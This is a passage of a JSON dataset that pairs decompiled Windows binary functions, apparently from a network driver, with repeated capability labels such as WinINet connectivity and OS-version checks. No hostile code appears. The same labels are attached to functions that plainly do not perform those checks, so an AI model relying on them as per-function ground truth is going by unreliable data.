(arg2 != 4) {\n            return 0;\n        }\n        uVar1 = *0x80248;\n        arg2_00 = 0x38e5c;\n    }\n    arg1_00 = *(uVar1 + arg1);\n    if ((arg1_00 != 0) && (arg2_00 != 0)) {\n        arg4 = &stack0x00000010;\n        uVar2 = fcn.000546e4(arg1_00, 0x50, 5, arg4);\n        if (uVar2 != 0) {\n            return uVar2;\n        }\n        if (4 < in_stack_00000010) {\n            fcn.00032650(0x800a0, &stack0x00000018, 1);\n            piVar3 = *0x800b8;\n            if (*0x800b8 != NULL) {\n                do {\n                    if (piVar3[1] == arg1) break;\n                    piVar3 = *piVar3;\n                } while (piVar3 != NULL);\n                if (piVar3 != NULL) {\n                    if (arg2 == 0) {\n                        arg3 = piVar3 + 3;\n                    }\n                    else if (arg2 == 2) {\n                        arg3 = piVar3 + 4;\n                    }\n                    else if (arg2 == 3) {\n                        arg3 = piVar3 + 6;\n                    }\n                    else if (arg2 == 4) {\n                        arg3 = piVar3 + 5;\n                    }\n                }\n            }\n            fcn.00032684(0x800a0, &stack0x00000018, 1);\n            uVar2 = fcn.000550f0(arg1_00, arg2_00, arg3, arg4, unaff_R12, unaff_RDI, unaff_RSI, unaff_RBP, unaff_RBX, \n                                 in_stack_00000000, in_stack_00000008, CONCAT44(in_stack_00000014, in_stack_00000010), \n                                 in_stack_00000018, in_stack_00000020, in_stack_00000028, in_stack_00000030, \n                                 in_stack_00000038, in_stack_00000040, in_stack_00000048, in_stack_00000050, \n                                 in_stack_00000058, in_stack_00000060, in_stack_00000068, in_stack_00000070, \n                                 in_stack_00000078);\n            return uVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 956
    },
    "0003935c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0003935c(ulong arg1)\n\n{\n    int32_t iVar1;\n    ulong unaff_RBX;\n    ulong unaff_RSI;\n    int64_t iVar2;\n    int32_t iVar3;\n    ulong unaff_RDI;\n    ulong in_R9;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    int32_t in_stack_00000010;\n    uint in_stack_00000014;\n    ulong arg1_00;\n    int64_t noname_15;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong arg1_01;\n    ulong noname_5;\n    ulong noname_6;\n    ulong noname_7;\n    \n    arg1_01 = 0;\n    noname_5 = 0;\n    noname_6 = 0;\n    noname_7 = 0;\n    arg1_00 = 0;\n    noname_15 = 0;\n    if (*0x800e8 == 0) {\n        iVar1 = fcn.00038350();\n        if ((iVar1 == 0) && (iVar1 = fcn.0003cd30(arg1, &stack0x00000020, &stack0x00000010),  iVar1 == 0)) {\n            fcn.000324cc(0x800a0);\n            fcn.0006677c(0x8e540, 0, 0x98);\n            fcn.000324cc(0x8e540);\n            iVar1 = fcn.00030a40(0x14780, &stack0x00000018);\n            if ((((iVar1 == 0) &&\n                 ((((iVar1 = fcn.0004e130(arg1_00, 0x144a0, &stack0xffffffffffffffc8),  iVar1 == 0 &&\n                    (iVar1 = fcn.0004e130(arg1_00, 0x14480, &stack0xffffffffffffffd0),  iVar1 == 0)) &&\n                   (iVar1 = fcn.0004e130(arg1_00, 0x14ae8, &stack0xffffffffffffffd8),  iVar1 == 0)) &&\n                  ((iVar1 = fcn.0004e130(arg1_00, 0x14ad0, &stack0xffffffffffffffe0),  iVar1 == 0 &&\n                   (iVar1 = fcn.000550f0(arg1_01, 0x39318, 0x800c8, in_R9, arg1_01, noname_5, noname_6, noname_7, \n                                         unaff_RDI, unaff_RSI, unaff_RBX, in_stack_00000000, in_stack_00000008, \n                                         CONCAT44(in_stack_00000014, in_stack_00000010), arg1_00, noname_15, \n                                         in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                                         in_stack_00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060, \n                                         in_stack_00000068),  iVar1 == 0)))))) &&\n                (iVar1 = fcn.000550f0(noname_5, 0x38c88, 0x800d0, in_R9, arg1_01, noname_5, noname_6, noname_7, \n                                      unaff_RDI, unaff_RSI, unaff_RBX, in_stack_00000000, in_stack_00000008, \n                                      CONCAT44(in_stack_00000014, in_stack_00000010), arg1_00, noname_15, \n                                      in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                                      in_stack_00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060, \n                                      in_stack_00000068),  iVar1 == 0)) &&\n               ((iVar1 = fcn.000550f0(noname_6, 0x38ee8, 0x800d8, in_R9, arg1_01, noname_5, noname_6, noname_7, \n                                      unaff_RDI, unaff_RSI, unaff_RBX, in_stack_00000000, in_stack_00000008, \n                                      CONCAT44(in_stack_00000014, in_stack_00000010), arg1_00, noname_15, \n                                      in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                                      in_stack_00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060, \n                                      in_stack_00000068),  iVar1 == 0 &&\n                (iVar1 = fcn.000550f0(noname_7, 0x38548, 0x800e0, in_R9, arg1_01, noname_5, noname_6, noname_7, \n                                      unaff_RDI, unaff_RSI, unaff_RBX, in_stack_00000000, in_stack_00000008, \n                                      CONCAT44(in_stack_00000014, in_stack_00000010), arg1_00, noname_15, \n                                      in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                                      in_stack_00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060, \n                                      in_stack_00000068),  iVar1 == 0)))) {\n                iVar3 = 0;\n                if (0 < in_stack_00000010) {\n                    iVar2 = 0;\n                    do {\n                        iVar1 = fcn.000391ac(*(iVar2 + noname_15));\n                        if (iVar1 != 0) goto code_r0x0003954d;\n                        iVar3 = iVar3 + 1;\n                        iVar2 = iVar2 + 8;\n                    } while (iVar3 < in_stack_00000010);\n                }\n                *0x800e8 = 1;\n            }\n        }\ncode_r0x0003954d:\n        fcn.00030d24(noname_15);\n        if (iVar1 != 0) {\n            fcn.00038f60();\n        }\n    }\n    else {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 1542
    },
    "00039968": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00039968(int64_t arg1, ulong *arg2)\n\n{\n    ulong *puVar1;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x800f8, auStackX24, 0);\n    puVar1 = *0x80110;\n    do {\n        if (puVar1 == NULL) {\ncode_r0x000399b5:\n            fcn.00032684(0x800f8, auStackX24, 0);\n            return ~-(puVar1 != NULL) & 0xc000000e;\n        }\n        if (puVar1[3] == arg1) {\n            if (puVar1[6] == 0) {\n                puVar1 = NULL;\n            }\n            else {\n                *arg2 = puVar1[1];\n            }\n            goto code_r0x000399b5;\n        }\n        puVar1 = *puVar1;\n    } while( true );\n}\n",
        "token_count": 219
    },
    "0003a250": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0003a250(void)\n\n{\n    int32_t iVar1;\n    ulong unaff_RBX;\n    ulong in_R9;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong arg1;\n    ulong noname_12;\n    ulong noname_13;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    ulong in_stack_00000078;\n    ulong noname_4;\n    ulong noname_5;\n    ulong noname_6;\n    ulong in_stack_fffffffffffffff0;\n    \n    arg1 = 0;\n    noname_12 = 0;\n    noname_13 = 0;\n    noname_5 = 0;\n    noname_6 = 0;\n    noname_4 = 0;\n    if (*0x80180 == 0) {\n        iVar1 = fcn.00030a40(0x14780, &stack0x00000008);\n        if ((((iVar1 == 0) && (iVar1 = fcn.0004e130(in_stack_00000008, 0x14530, &stack0x00000018),  iVar1 == 0)) &&\n            (iVar1 = fcn.0004e130(in_stack_00000008, 0x14550, &stack0x00000010),  iVar1 == 0)) &&\n           (((iVar1 = fcn.0004e130(in_stack_00000008, 0x14b48, &stack0x00000020),  iVar1 == 0 &&\n             (iVar1 = fcn.0004e130(in_stack_00000008, 0x14b30, &stack0xffffffffffffffd8),  iVar1 == 0)) &&\n            ((iVar1 = fcn.0004e130(in_stack_00000008, 0x14b18, &stack0xffffffffffffffe0),  iVar1 == 0 &&\n             (iVar1 = fcn.0004e130(in_stack_00000008, 0x14b00, &stack0xffffffffffffffe8),  iVar1 == 0)))))) {\n            fcn.0006677c(0x800f8, 0, 0x28);\n            fcn.000324cc(0x800f8);\n            iVar1 = fcn.000550f0(arg1, 0x39774, 0x80150, in_R9, noname_4, noname_5, noname_6, in_stack_fffffffffffffff0\n                                 , unaff_RBX, in_stack_00000000, in_stack_00000008, arg1, noname_12, noname_13, \n                                 in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                                 in_stack_00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060, \n                                 in_stack_00000068, in_stack_00000070, in_stack_00000078);\n            if (iVar1 == 0) {\n                fcn.00059140(*0x80150);\n                iVar1 = fcn.000550f0(noname_12, 0x39f04, 0x80158, in_R9, noname_4, noname_5, noname_6, \n                                     in_stack_fffffffffffffff0, unaff_RBX, in_stack_00000000, in_stack_00000008, arg1, \n                                     noname_12, noname_13, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                                     in_stack_00000040, in_stack_00000048, in_stack_00000050, in_stack_00000058, \n                                     in_stack_00000060, in_stack_00000068, in_stack_00000070, in_stack_00000078);\n                if (iVar1 == 0) {\n                    fcn.00059140(*0x80158);\n                    iVar1 = fcn.000550f0(noname_13, 0x39f2c, 0x80178, in_R9, noname_4, noname_5, noname_6, \n                                         in_stack_fffffffffffffff0, unaff_RBX, in_stack_00000000, in_stack_00000008, \n                                         arg1, noname_12, noname_13, in_stack_00000028, in_stack_00000030, \n                                         in_stack_00000038, in_stack_00000040, in_stack_00000048, in_stack_00000050, \n                                         in_stack_00000058, in_stack_00000060, in_stack_00000068, in_stack_00000070, \n                                         in_stack_00000078);\n                    if (iVar1 == 0) {\n                        fcn.00059140(*0x80178);\n                        iVar1 = fcn.000550f0(noname_4, 0x3980c, 0x80170, in_R9, noname_4, noname_5, noname_6, \n                                             in_stack_fffffffffffffff0, unaff_RBX, in_stack_00000000, in_stack_00000008\n                                             , arg1, noname_12, noname_13, in_stack_00000028, in_stack_00000030, \n                                             in_stack_00000038, in_stack_00000040, in_stack_00000048, in_stack_00000050\n                                             , in_stack_00000058, in_stack_00000060, in_stack_00000068, \n                                             in_stack_00000070, in_stack_00000078);\n                        if (iVar1 == 0) {\n                            fcn.00059140(*0x80170);\n                            iVar1 = fcn.000550f0(noname_5, 0x397e8, 0x80168, in_R9, noname_4, noname_5, noname_6, \n                                                 in_stack_fffffffffffffff0, unaff_RBX, in_stack_00000000, \n                                                 in_stack_00000008, arg1, noname_12, noname_13, in_stack_00000028, \n                                                 in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                                                 in_stack_00000048, in_stack_00000050, in_stack_00000058, \n                                                 in_stack_00000060, in_stack_00000068, in_stack_00000070, \n                                                 in_stack_00000078);\n                            if (iVar1 == 0) {\n                                fcn.00059140(*0x80168);\n                                *0x80180 = 1;\n                                return 0;\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        fcn.0003a168();\n    }\n    else {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 1622
    },
    "0003a5b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0003a5b4(ulong noname_0, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int64_t aiStack296 [2];\n    uchar uStack280;\n    uchar uStack279;\n    ushort uStack278;\n    int32_t iStack276;\n    uint uStack272;\n    uint uStack248;\n    ulong uStack240;\n    uint32_t uStack40;\n    uchar auStack32 [8];\n    \n    aiStack296[0] = 0;\n    uVar3 = fcn.00032f64(noname_0, aiStack296);\n    if (uVar3 == 0) {\n        if (aiStack296[0] == 0) {\n            uVar3 = 0xc000009d;\n        }\n        else {\n            fcn.0006685a(&uStack280, 0x100);\n            iVar1 = fcn.0002fc18(auStack32);\n            if (iVar1 == 0) {\n                uVar3 = 0xc0000001;\n            }\n            else {\n                uStack280 = 0x96;\n                uStack279 = 1;\n                uStack278 = 0xf0;\n                uStack272 = 0;\n                if ((arg2 == 0) || (arg2 == 1)) {\n                    uStack248 = arg3;\n                    uStack240 = arg4;\n                }\n                iStack276 = arg2;\n                uVar2 = (**0x7ff08)(aiStack296[0], &uStack280);\n                if (uVar2 == 0x103) {\n                    fcn.0002fce4(auStack32, 0xffffffff);\n                    uVar2 = uStack40;\n                }\n                uVar3 = uVar2;\n                fcn.0002fc94(auStack32);\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 441
    },
    "0003a6a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0003a6a4(uint64_t arg1, ulong arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uint8_t uVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int32_t aiStackX32 [2];\n    int64_t aiStack72 [3];\n    \n    aiStack72[0] = 0;\n    uVar4 = fcn.00032f64(arg1, aiStack72);\n    if (uVar4 == 0) {\n        if (aiStack72[0] == 0) {\n            uVar4 = 0xc000009d;\n        }\n        else {\n            uVar4 = fcn.00033958(arg1 & 0xffffffff, aiStackX32);\n            if (uVar4 == 0) {\n                if (aiStackX32[0] == 1) {\n                    iVar5 = (**0x7fef0)(*0x7fec0, 0x10, 0);\n                    if (iVar5 == 0) {\n                        uVar4 = 0xc000009a;\n                    }\n                    else {\n                        uVar3 = (**0x7ff58)();\n                        iVar1 = *(iVar5 + 8);\n                        *(iVar5 + 0xb8) = uVar3 << 0x38;\n                        *(iVar5 + 0x88) = *(iVar5 + 0x88) | 1;\n                        *(iVar5 + 0x78) = aiStack72[0];\n                        if (iVar1 != 0) {\n                            iVar2 = *(iVar1 + 0x20);\n                            if ((*(iVar2 + 10) & 5) == 0) {\n                                iVar6 = (**0x11230)(iVar2, 0, 1, 0, 0, 0x20);\n                            }\n                            else {\n                                iVar6 = *(iVar2 + 0x18);\n                            }\n                            if ((arg3 <= *(iVar2 + 0x28)) && (iVar6 != 0)) {\n                                fcn.0006670a(iVar6, arg2, arg3);\n                                *(iVar1 + 0x18) = arg3;\n                                *(iVar1 + 0x28) = 0;\n                                *(iVar1 + 0x10) = 0;\n                                (**0x7ff10)(aiStack72[0], iVar5, 0, 0);\n                                return 0;\n                            }\n                        }\n                        uVar4 = 0xc000009a;\n                        (**0x7fef8)(iVar5);\n                    }\n                }\n                else {\n                    uVar4 = 0xc00000a3;\n                }\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 615
    },
    "0003a908": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0003a908(uint64_t arg1)\n\n{\n    int64_t arg3;\n    ulong arg4;\n    int64_t arg2;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int64_t arg2_00;\n    code *pcVar4;\n    int64_t iVar5;\n    ulong arg1_00;\n    uint64_t arg1_01;\n    int32_t aiStackX16 [2];\n    uchar auStackX24 [8];\n    ushort uStackX32;\n    ushort uStackX34;\n    ushort uStackX36;\n    int64_t iStack248;\n    int32_t iStack240;\n    int32_t iStack236;\n    uchar uStack232;\n    uchar uStack231;\n    ushort uStack230;\n    uchar *puStack224;\n    int32_t *piStack216;\n    uint uStack208;\n    uchar *puStack200;\n    ushort *puStack192;\n    uint uStack184;\n    uchar auStack176 [24];\n    uchar auStack152 [88];\n    \n    arg1_01 = arg1 & 0xffffffff;\n    iStack240 = 0;\n    uStackX32 = 0x888e;\n    uStackX34 = 0x8100;\n    iStack236 = 0;\n    uStackX36 = 0x806;\n    uVar3 = fcn.00032f64(arg1, &iStack248);\n    if (uVar3 != 0) {\n        return uVar3;\n    }\n    if (iStack248 != 0) {\n        return uVar3;\n    }\n    arg2_00 = fcn.00030cc4(0x208);\n    if (arg2_00 == 0) {\n        return 0x21590004;\n    }\n    uVar3 = fcn.00032e10(arg1_01, arg2_00, 0x104);\n    if (uVar3 != 0) {\n        return uVar3;\n    }\n    fcn.00066704(auStack176, arg2_00);\n    fcn.0006677c(&uStack232, 0, 0x38);\n    puStack224 = auStack176;\n    piStack216 = &iStack240;\n    uStack230 = 0x38;\n    uStack232 = 0x87;\n    uStack231 = 1;\n    iVar1 = fcn.00034084(arg1_01, aiStackX16);\n    if ((iVar1 == 0) && (aiStackX16[0] != iStack240)) {\n        uStack208 = 2;\n        iStack236 = aiStackX16[0];\n    }\n    else {\n        uStack208 = 1;\n    }\n    puStack200 = auStackX24;\n    uStack184 = 3;\n    puStack192 = &uStackX32;\n    pcVar4 = fcn.000547bc(*0x80188);\n    uVar2 = (*pcVar4)(*0x80190, arg1_01, &uStack232, auStack152, &iStack248);\n    if (uVar2 == 0x103) {\n        uVar2 = fcn.00033d10(arg1_01);\n    }\n    uVar3 = uVar2;\n    if (uVar2 == 0) {\n        uVar2 = fcn.00033744(arg1_01, 1);\n        arg2 = iStack248;\n        uVar3 = uVar2;\n        iVar5 = iStack248;\n        if (uVar2 == 0) {\n            do {\n                arg3 = *(iVar5 + 0x10);\n                if (arg3 == 0) {\n                    iVar5 = 0;\n                }\n                else {\n                    iVar5 = *(arg3 + 0x10);\n                }\n            } while ((iVar5 != 0) && (arg3 != iVar5));\n            if (arg3 != 0) {\n                arg4 = *(arg3 + 0x18);\n                arg1_00 = fcn.0003a560(arg3);\n                iVar1 = fcn.00039a40(arg1_00);\n                if ((iVar1 == 0) || (iVar1 == -0x3fffffdf)) {\n                    iVar1 = fcn.000399e0(arg1_01, arg2, arg3, arg4);\n                    if (iVar1 == 0) {\n                        fcn.0003aec4(arg2, 0);\n                        fcn.00037c3c();\n                    }\n                    else {\n                        fcn.00039e10(arg1_00);\n                    }\n                }\n                if (iVar1 == 0) {\n                    fcn.0003a814(arg1_01);\n                    goto code_r0x0003ab29;\n                }\n            }\n        }\n        (**0x8e6c0)(iStack248);\n    }\ncode_r0x0003ab29:\n    fcn.00030d24(arg2_00);\n    return uVar3;\n}\n",
        "token_count": 1115
    },
    "0003ad40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003ad40(void)\n\n{\n    if (*0x80198 == 0) {\n        *0x80198 = 1;\n        fcn.000324cc(0x8e710);\n        *0x8e700 = 0;\n        *0x8e708 = 0;\n    }\n    return;\n}\n",
        "token_count": 76
    },
    "0003adfc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0003adfc(int64_t *arg1, int64_t **arg2)\n\n{\n    int64_t **ppiVar1;\n    int64_t **ppiVar2;\n    ulong uVar3;\n    int32_t iVar4;\n    uchar auStackX16 [24];\n    \n    *arg2 = NULL;\n    uVar3 = 0xc0000001;\n    fcn.00032650(0x8e710, auStackX16, 1);\n    iVar4 = 0;\n    ppiVar2 = *0x8e708;\n    if (0 < *0x8e700) {\n        do {\n            for (ppiVar1 = *ppiVar2; ppiVar1 != NULL; ppiVar1 = *ppiVar1) {\n                if ((arg1 == ppiVar1[2]) && (*ppiVar1 != NULL)) {\n                    if ((*ppiVar1)[2] != NULL) {\n                        iVar4 = 0;\n                        ppiVar2 = *0x8e708 + 3;\n                        goto code_r0x0003ae80;\n                    }\n                    break;\n                }\n            }\n            iVar4 = iVar4 + 1;\n            ppiVar2 = ppiVar2 + 4;\n        } while (iVar4 < *0x8e700);\n    }\n    goto code_r0x0003aea3;\n    while( true ) {\n        iVar4 = iVar4 + 1;\n        ppiVar2 = ppiVar2 + 4;\n        if (*0x8e700 <= iVar4) break;\ncode_r0x0003ae80:\n        if (*ppiVar2 == (*ppiVar1)[2]) {\n            uVar3 = 0;\n            *arg2 = (*0x8e708)[iVar4 * 4 + 1];\n            break;\n        }\n    }\ncode_r0x0003aea3:\n    fcn.00032684(0x8e710, auStackX16, 1);\n    return uVar3;\n}\n",
        "token_count": 443
    },
    "0003b16c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003b16c(void)\n\n{\n    if (*0x80198 != 0) {\n        fcn.0003aec4(0, 1);\n        fcn.000326c0(0x8e710);\n        *0x80198 = 0;\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0003b324": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0003b324(ulong arg1, ulong arg2, uchar *arg3, int64_t *arg4)\n\n{\n    ulong uVar1;\n    ulong in_stack_00000028;\n    \n    (**0x11070)(arg4, arg1, arg2, 0);\n    if (*arg4 == 0) {\n        uVar1 = 0xc0000001;\n    }\n    else {\n        fcn.0006685a(arg3, 0xf0);\n        *(arg3 + 8) = 0x3b310;\n        *arg3 = 5;\n        *(arg3 + 0x20) = 0x3b300;\n        arg3[1] = 1;\n        *(arg3 + 0x30) = 0x3b2dc;\n        *(arg3 + 0x10) = 0;\n        *(arg3 + 0x40) = 0x3b2bc;\n        *(arg3 + 0x18) = 0;\n        *(arg3 + 0x50) = 0x3b2a4;\n        *(arg3 + 0x70) = 0x3b28c;\n        *(arg3 + 0x78) = 0x3b270;\n        *(arg3 + 0x58) = 0x3b254;\n        *(arg3 + 0x60) = 0x3b234;\n        *(arg3 + 0x80) = 0x3b214;\n        *(arg3 + 0x28) = 0x3b204;\n        *(arg3 + 0x38) = 0x3b1e8;\n        *(arg3 + 0xb8) = 0x3b1d0;\n        *(arg3 + 0xc0) = 0x3b1b0;\n        *(arg3 + 200) = 0x3b1a0;\n        uVar1 = (**0x11078)(*arg4, arg3, 0xf0, in_stack_00000028);\n    }\n    return uVar1;\n}\n",
        "token_count": 472
    },
    "0003b448": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0003b448(int64_t arg1, int64_t *arg2, int32_t *arg3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    ulong *puVar5;\n    ulong uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    int64_t aiStackX8 [3];\n    ulong uStackX32;\n    uint uVar11;\n    int64_t *piVar10;\n    int64_t iStack696;\n    ulong uStack688;\n    ulong uStack680;\n    uchar auStack672 [24];\n    uchar auStack648 [240];\n    uchar auStack408 [48];\n    int64_t iStack360;\n    \n    iStack696 = 0;\n    aiStackX8[0] = 0;\n    if ((arg1 == 0) || (*(arg1 + 0x30) == 0)) {\n        iVar2 = 0x21590065;\n    }\n    else {\n        fcn.00066704(auStack672, 0x1203c);\n        fcn.0006670a(auStack408, arg1, 0x150);\n        piVar10 = aiStackX8;\n        uVar6 = *(iStack360 + 0x28);\n        uStackX32 = uVar6;\n        iVar2 = fcn.0003b324(arg1, auStack672, auStack648, &iStack696);\n        iVar9 = aiStackX8[0];\n        if (iVar2 == 0) {\n            uVar8 = 0;\n            do {\n                uVar11 = piVar10 >> 0x20;\n                iVar4 = uVar8;\n                iVar7 = uVar8 + iVar9;\n                cVar1 = (**0x114b0)(iVar7);\n                if ((cVar1 == '\\0') || (cVar1 = (**0x114b0)(iVar7 + 0xf0),  cVar1 == '\\0')) break;\n                piVar10 = CONCAT44(uVar11, 1);\n                iVar3 = fcn.0006674c(iVar7, auStack648, 0xf0, 1, piVar10);\n                if (iVar3 == 0) goto code_r0x0003b54c;\n                uVar8 = iVar4 + 1U;\n            } while (iVar4 + 1U < 0x50);\n            iVar4 = -1;\ncode_r0x0003b54c:\n            if (iVar4 != -1) {\n                *0x8e468 = iVar4 + 1;\n                *0x8e464 = iVar4;\n            }\n            *0x8e460 = iVar4;\n            *0x8e470 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3b310);\n            if (((((*0x8e470 == -1) || (*0x8e47c = fcn.0003d23c(aiStackX8[0], 0x200, 0x3b300),  *0x8e47c == -1)) ||\n                 (*0x8e484 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3b2dc),  *0x8e484 == -1)) ||\n                ((*0x8e48c = fcn.0003d23c(aiStackX8[0], 0x200, 0x3b2bc),  *0x8e48c == -1 ||\n                 (*0x8e494 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3b2a4),  *0x8e494 == -1)))) ||\n               ((((*0x8e4a4 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3b28c),  *0x8e4a4 == -1 ||\n                  ((*0x8e4a8 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3b270),  *0x8e4a8 == -1 ||\n                   (*0x8e498 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3b254),  *0x8e498 == -1)))) ||\n                 (*0x8e49c = fcn.0003d23c(aiStackX8[0], 0x200, 0x3b234),  *0x8e49c == -1)) ||\n                ((((*0x8e4ac = fcn.0003d23c(aiStackX8[0], 0x200, 0x3b214),  *0x8e4ac == -1 ||\n                   (*0x8e480 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3b204),  *0x8e480 == -1)) ||\n                  (*0x8e488 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3b1e8),  *0x8e488 == -1)) ||\n                 (((*0x8e4c8 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3b1d0),  *0x8e4c8 == -1 ||\n                   (*0x8e4cc = fcn.0003d23c(aiStackX8[0], 0x200, 0x3b1b0),  *0x8e4cc == -1)) ||\n                  ((*0x8e4d0 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3b1a0),  *0x8e4d0 == -1 ||\n                   (*0x8e46c = fcn.0003d23c(aiStackX8[0], 0x200, iStack696),  *0x8e46c == -1)))))))))) {\n                iVar2 = 0x21590005;\n                uVar6 = uStackX32;\n            }\n            else {\n                uVar6 = uStackX32;\n                if (arg2 != NULL) {\n                    *arg2 = 0;\n                    uVar6 = 0;\n                    *arg3 = 0;\n                    puVar5 = fcn.00030cc4(8);\n                    *arg2 = puVar5;\n                    if (puVar5 == NULL) {\n                        iVar2 = -0x3fffff66;\n                        uVar6 = uStackX32;\n                    }\n                    else {\n                        *puVar5 = 0;\n                        fcn.0001aac0(CONCAT71(uVar6 >> 8, 2), &uStack688, &uStack680);\n                        iVar9 = aiStackX8[0];\n                        iVar7 = aiStackX8[0];\ncode_r0x0003b7f0:\n                        if ((iVar9 == 0) || (*arg2 == 0)) goto code_r0x0003b862;\n                        if ((iVar9 == iVar7) || (*(iVar9 + 0x1a) == 0)) {\ncode_r0x0003b83d:\n                            iVar9 = *(iVar9 + 8);\n                            goto code_r0x0003b7f0;\n                        }\n                        iVar4 = fcn.00031630(arg2, *arg3 << 3, *arg3 + 1 << 3);\n                        if (iVar4 == 0) {\n                            *arg2[*arg3] = iVar9;\n                            *arg3 = *arg3 + 1;\n                            iVar7 = aiStackX8[0];\n                            goto code_r0x0003b83d;\n                        }\n                        iVar2 = 